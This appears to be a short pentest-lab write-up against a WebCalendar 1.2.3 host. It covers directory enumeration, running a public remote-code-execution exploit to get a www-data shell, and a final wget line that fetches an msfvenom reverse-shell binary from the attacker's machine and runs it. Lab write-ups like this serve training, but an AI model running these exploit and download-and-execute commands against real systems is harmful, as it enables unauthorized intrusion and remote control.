# 3 :80 webcalendar 1.2.3

```
http://192.168.144.37/
Splash Page with progress bar

$ gobuster dir -u http://192.168.144.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 80
===============================================================
/resources            (Status: 301) [Size: 320] [--> http://192.168.144.37/resources/]
/index                (Status: 200) [Size: 5105]
/index.html           (Status: 200) [Size: 5105]
/send                 (Status: 200) [Size: 3168]
/send.php             (Status: 200) [Size: 3168]

# nikto
+ OSVDB-3093: /webcalendar/login.php: This might be interesting... has been seen in web logs from an unknown scanner.

http://192.168.144.37/webcalendar/login.php
WebCalendar Login Page
v1.2.3 (14 Aug 2010)

Using https://www.exploit-db.com/exploits/18775
$ php 18775.php 192.168.144.37 /webcalendar/
+-------------------------------------------------------------+
| WebCalendar <= 1.2.4 Remote Code Executionn Exploit by EgiX |
+-------------------------------------------------------------+

webcalendar-shell# whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ucal
Linux ucal 3.0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux

# stable shell using 
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.144 LPORT=25 -f elf -o kshell
webcalendar-shell# wget 192.168.49.144/kshell -O /tmp/kshell && chmod +x /tmp/kshell && /tmp/kshell
```
